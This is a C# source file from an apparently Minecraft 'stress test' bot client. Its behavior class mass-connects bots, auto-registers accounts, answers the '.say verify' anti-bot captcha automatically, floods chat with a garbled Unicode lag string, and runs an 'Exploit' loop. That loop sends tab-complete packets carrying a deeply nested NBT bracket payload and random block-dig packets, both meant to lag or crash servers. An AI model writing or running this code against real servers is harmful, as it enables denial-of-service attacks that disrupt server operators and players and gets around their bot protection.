using System.Collections.Concurrent;
using System.ComponentModel;
using System.Reactive.Disposables;
using System.Reactive.Linq;
using System.Text.RegularExpressions;
using HolyClient.Abstractions.StressTest;
using McProtoNet;
using McProtoNet.Abstractions;
using McProtoNet.Protocol;
using McProtoNet.Protocol754;
using ReactiveUI;
using Serilog;

namespace HolyClient.StressTest;

public class DefaultBehavior : BaseStressTestBehavior
{
    private static Regex SayVerifyRegex = new(@"\.say \/verify (\d+)");

    private IObservable<long> StaticSpam;

    [DisplayName("Spam text")] public string SpamText { get; set; } = "!Spam Spam Spam";

    [DisplayName("Spam timeout")] public int SpamTimeout { get; set; } = 1000;

    [DisplayName("Reconnect timeout")] public int ReconnectTimeout { get; set; } = 1000;

    [DisplayName("Reconnect count")] public int Reconnects { get; set; } = 1;

    [DisplayName("Spam Nocom")] public bool SpamNocom { get; set; } = false;

    public override Task Activate(CompositeDisposable disposables, IEnumerable<IStressTestBot> bots, ILogger logger,
        CancellationToken cancellationToken)
    {
        logger.Information("Start default behavior");
        StaticSpam = Observable.Interval(TimeSpan.FromMilliseconds(SpamTimeout), RxApp.TaskpoolScheduler);
        string tabComplete = "msg @a[nbt=" + payload + "]";
        ConcurrentBag<int> entities = new();
        Slot slot = new Slot();
        slot.ItemId = 56;
        slot.ItemCount = 1;

        foreach (var bot in bots)
        {
            Protocol_754 proto = new Protocol_754(bot.Client);


            proto.OnKeepAlivePacket.Subscribe(x => { proto.SendKeepAlive(x.KeepAliveId); });
            proto.OnSpawnEntityPacket.Subscribe(x => { entities.Add(x.EntityId); });
            proto.OnChatPacket.Subscribe(async captch =>
            {
                const string sf = ".say verify";
                if (captch.Message.Contains("say verify"))
                {
                    int index = captch.Message.IndexOf(sf);
                    if (index >= 0)
                    {
                        await proto.SendChat(captch.Message.Substring(index, sf.Length + 4));
                    }
                }
            });
            proto.OnLoginPacket.Subscribe(async x =>
            {
                try
                {
                    await Task.Delay(2000);
                    await proto.SendChat("/register 21qwerty 21qwerty");
                    await Task.Delay(1000);

                    _ = Exploit(proto);
                    _ = Spam(proto);
                }
                catch
                {
                }
            });

            bot.Client.StateChanged += async (sender, args) =>
            {
                if (args.State == MinecraftClientState.Errored)
                {
                    //logger.Error(args.Error,"Disconnect Error");
                    await Task.Delay(3000);
                    await bot.Restart(true);
                }
            };

            _ = bot.Restart(true);
        }

        return Task.CompletedTask;

        async Task Exploit(Protocol_754 proto)
        {
            try
            {
                while (true)
                {
                    await Task.Delay(100);
                    if (Random.Shared.NextDouble() >= 0.5)
                    {
                        await proto.SendTabComplete(Random.Shared.Next(0, 30), tabComplete);
                    }
                    else
                    {
                        var pos = new Position(Random.Shared.Next(-10000, 1000), Random.Shared.Next(-10000, 1000),
                            Random.Shared.Next(0, 256));
                        await proto.SendBlockDig(0, pos, 0);
                        await proto.SendBlockDig(2, pos, 0);
                        //await proto.SendTabComplete(Random.Shared.Next(0, 30),
                        // "/to for(i=0;i<256;i++){for(j=0;j<256;j++){for(k=0;k<256;k++){for(l=0;l<256;l++){ln(pi)}}}}");
                        //await proto.SendWindowClick(0, 36, 1, 1, 1, slot);
                    }

                    await proto.SendArmAnimation(0);
                }
            }
            catch (Exception e)
            {
            }
        }

        async Task Spam(Protocol_754 proto)
        {
            try
            {
                while (true)
                {
                    await Task.Delay(1000);
                    await proto.SendChat(lagMessage);
                }
            }
            catch (Exception e)
            {
            }
        }
    }

    private const string lagMessage =
        "null梭꿿苁ᢣ쬨?Ꮥ軉㚵龁ꥰ䙏껎娇敲\uf1fa\u2731衍\uf118쵌虎\u256d䁉횋祅\u2bd4澙봮ꆃᱨ䡮捺좢\uf7ca告쪐읭籡\u0304৫錫埅᠂\u2813蹃㵺븥鰜恂?勔\uf197盡ᑐ紒㺏\u1758筏信뉪?祉\ue160让ᐢ촯쨵\u0c01濳녂ｽ낌㾅뱝㲈敮ᱤ\u25ef风쓫谘쁫荬놙쁁\u2b39堾ἢ蟜ㅝ\u222e褉竨陼翲䗅륹\uf30e홴Ҵሾㅪ莍ආ爥果둰?蜮㟯\u032d崍퀒낢려设牢睟\ue605\u0f31෯꿍팃ꦤ愮旓ᅗⲰ틬㼰뜍둲\u206c쉬᠓\u2540靅\u1a56蠒睩咸\u17f2쉬ⶬ쭉糷ᧈ츷博苾机ꁘ굝샕ߜ杲ꏄ꾤曍ቈ㥬褞脴戰\uf876쑍뮴\u139e\uebd2鉞\ue3f9\u2205삧\uea3a綎鰞뚢嗝贫읲ᰌ퓟勘爱痟駵駙\u187a뒤\u2003ꡢ坱蔊ꊭ\uf72b滨孃㝬鿙鞸";

    private const string payload =
        "{a:[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[}";
}